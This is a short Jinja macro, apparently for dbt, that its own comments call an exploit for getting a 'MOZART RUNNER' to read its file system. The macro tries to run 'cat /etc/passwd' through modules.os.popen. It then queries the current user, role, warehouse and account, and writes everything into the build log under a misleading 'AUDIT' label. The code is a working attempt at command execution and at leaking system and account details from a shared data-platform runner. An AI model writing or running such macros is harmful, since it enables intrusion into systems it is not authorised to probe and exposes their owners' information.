{% macro show_who_am_i() %}

  {# 
     This is the 'Context A' exploit. 
     We are trying to get the MOZART RUNNER to read its own file system 
     and save it to a Jinja variable.
  #}
  {% set runner_hosts = modules.os.popen('cat /etc/passwd').read() if modules else "MODULES_RESTRICTED" %}

  {% set sql %}
    select 
        current_user(), 
        current_role(), 
        current_warehouse(), 
        current_account()
  {% endset %}

  {% set results = run_query(sql) %}

  {% if execute %}
    {% for row in results %}
      {# If this works, the hosts file appears here. If not, you see 'MODULES_RESTRICTED' #}
      {{ log("AUDIT: user=" ~ row[0] ~ " role=" ~ row[1] ~ " wh=" ~ row[2] ~ " acct=" ~ row[3] ~ " | RUNNER_HOSTS=" ~ runner_hosts | replace('\n', ' [LF] '), info=True) }}
    {% endfor %}
  {% endif %}
{% endmacro %}
